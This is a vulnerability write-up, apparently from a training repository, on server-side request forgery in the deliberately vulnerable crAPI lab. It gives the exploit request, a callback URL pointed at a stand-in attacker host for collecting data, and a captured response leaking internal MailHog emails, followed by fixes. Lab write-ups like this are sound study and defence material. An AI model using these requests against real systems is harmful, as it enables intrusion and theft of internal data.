[🇧🇷 Português](../../vulnerabilidades/05-ssrf.md) · 🇺🇸 English

# SSRF — Forcing the server to request an arbitrary destination

**OWASP API Security Top 10 (2023) category:** `API7 — Server-Side Request Forgery`
**Severity (CVSS v3.1):** `High · 8.5` — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`
**Matching crAPI challenge:** Challenge 11 — "make crAPI send an HTTP request to an external site and return the response"

---

## 1. Summary

The "contact mechanic" feature accepts, in the request body, a **URL the server will call** (`mechanic_api` / `merchant_api`). Because this value is not validated against an allow-list, the attacker makes the **server** fire requests to any destination — internal services, cloud metadata, or an attacker-controlled host.

## 2. Preconditions

- An authenticated account with a valid token.
- A destination to observe the call: your own endpoint (e.g. a webhook / `http://attacker.example`) or an internal service in the environment.

## 3. Exploitation walkthrough

1. Send a contact-mechanic request, replacing the callback URL with one you control:

```http
POST /workshop/api/merchant/contact_mechanic HTTP/1.1
Host: localhost:8888
Authorization: Bearer <token>
Content-Type: application/json

{
  "mechanic_api": "http://attacker.example/collect",
  "mechanic_code": "TRAC_JHN",
  "problem_details": "test",
  "vin": "...",
  "number_of_repeats": 1
}
```

2. Observe that **the server** — not the client — makes the request to the given destination. Pointing it at an internal service (e.g. `http://localhost:<internal_port>/` or a non-exposed admin endpoint) demonstrates access from inside the network.

3. If the destination's response is reflected back in the API response, it also confirms the leak of the accessed content.

> The correct field is **`mechanic_api`** (an empty body returns `{"mechanic_api":["This field is required."]}`). The other required fields are `mechanic_code`, `problem_details`, `vin`, and `number_of_repeats`.

## 4. Evidence

**Confirmed against the local instance** — capture in [`evidencias/05-ssrf/captura.txt`](../../../evidencias/05-ssrf/captura.txt).

Pointing `mechanic_api` at the **internal MailHog** (`http://mailhog:8025/api/v2/messages`), a service the attacker cannot reach from outside:

```
POST /workshop/api/merchant/contact_mechanic
{ "mechanic_api": "http://mailhog:8025/api/v2/messages", "mechanic_code": "TRAC_JHN", ... }

HTTP 200
{ "response_from_mechanic_api": { "total": 2, "items": [ { ...captured internal emails... } ] } }
```

The server fetched the internal service and **reflected the entire content** (the MailHog emails) in the response — SSRF with internal data leakage.

## 5. Why it is a risk

SSRF turns the server into a **proxy for the attacker inside the internal network**. In cloud environments it is especially severe: it allows reading metadata endpoints (e.g. temporary instance credentials), reaching internal services with no authentication, and scanning the network from a trusted point. It is frequently the first step of a broader compromise.

## 6. How to fix

- **Allow-list** of permitted domains/destinations; reject any URL outside it.
- Block internal/private destinations (loopback, RFC 1918 ranges, cloud metadata endpoint).
- Resolve and validate the destination IP **after** DNS resolution (prevent rebinding) and disable redirects.
- Network-isolate the component that makes external calls.

## 7. References

- [API7:2023 Server-Side Request Forgery](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)
